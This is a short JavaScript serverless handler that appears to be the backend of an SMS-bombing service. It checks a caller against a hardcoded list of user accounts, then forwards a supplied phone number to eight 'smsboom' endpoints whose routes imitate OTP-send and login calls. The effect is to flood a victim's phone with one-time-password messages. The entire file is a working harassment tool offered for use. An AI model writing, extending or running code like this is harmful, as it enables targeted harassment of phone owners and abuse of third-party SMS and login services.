export default async function handler(req, res) {

  const { number, id } = req.query;

  if (!number) {
    return res.status(400).json({ error: "number required" });
  }

  const USERS = [
    { id: "blueanzo حكر", active: true },
    { id: "1", active: true },
    { id: "fahim", active: true },
    { id: "client1", active: false }
  ];

  const u = USERS.find(x => x.id === id);

  if (!u) {
    return res.json({ ok:false, msg:"Invalid user" });
  }

  if (!u.active) {
    return res.json({ ok:false, msg:"Account Offline" });
  }

  const APIS = [
    "https://smsboom.vercel.app/send-otp",
    "https://smsbooma.vercel.app/verify-phone",
    "https://smsboomc.vercel.app/shikho-send-otp",
    "https://smsboomg.vercel.app/bondi-login",
    "https://smsboomi.vercel.app/bioscope-login",
    "https://smsboomj.vercel.app/send-otp",
    "https://smsboomk.vercel.app/send-otp",
    "https://smsboomm.vercel.app/send-otp"
  ];

  for (const api of APIS) {
    try {
      await fetch(`${api}?number=${encodeURIComponent(number)}`);
    } catch (e) {}
  }

  res.json({ ok: true });

}
